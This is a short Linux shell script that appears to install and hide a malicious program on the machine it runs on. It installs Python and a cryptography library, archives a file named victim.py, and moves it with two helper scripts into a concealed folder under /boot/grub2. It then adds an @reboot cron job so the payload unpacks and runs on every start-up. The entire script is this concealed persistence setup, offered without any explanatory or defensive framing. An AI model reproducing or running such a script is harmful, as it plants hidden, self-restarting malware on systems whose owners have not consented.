yum install -y gcc
yum install -y python3 
pip3 install ez_setup
pip3 install wheel
pip3 install unroll
pip3 install setuptools
pip3 install pycryptodome
tar -czvf startup ./victim.py
rm victim.py
mkdir /boot/grub2/assets
mv startup /boot/grub2/assets
mv unzip.sh /boot/grub2/assets
mv remove-victim.sh /boot/grub2/assets
crontab -l > cron.txt
echo "@reboot /boot/grub2/assets/unzip.sh" >> cron.txt
crontab cron.txt
rm cron.txt
ip addr